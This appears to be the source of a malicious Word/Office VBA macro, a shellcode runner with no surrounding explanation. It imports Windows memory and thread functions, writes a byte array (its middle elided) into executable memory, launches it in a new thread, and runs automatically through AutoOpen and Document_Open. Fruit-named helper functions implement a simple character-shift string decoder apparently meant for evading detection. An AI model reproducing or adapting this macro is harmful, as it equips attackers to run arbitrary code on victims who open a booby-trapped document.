

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Function Pears(Beets)
 Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
 Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
 Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
 Do
 Oatmilk = Oatmilk + Pears(Strawberries(Milk))
 Milk = Almonds(Milk)
 Loop While Len(Milk) > 0
 Nuts = Oatmilk
End Function

Function MyMacro()
 Dim Apples As String
 Dim Water As String
 Dim buf As Variant
 Dim addr As LongPtr
 Dim counter As Long
 Dim data As Long
 Dim res As Long

 buf = Array(252, ............................. 203)
 
 addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

 For counter = LBound(buf) To UBound(buf)
  data = buf(counter)
  res = RtlMoveMemory(addr + counter, data, 1)
  Next counter

 res = CreateThread(0, 0, addr, 0, 0, 0)

End Function

Sub AutoOpen()
 MyMacro
End Sub

Sub Document_Open()
 MyMacro
End Sub


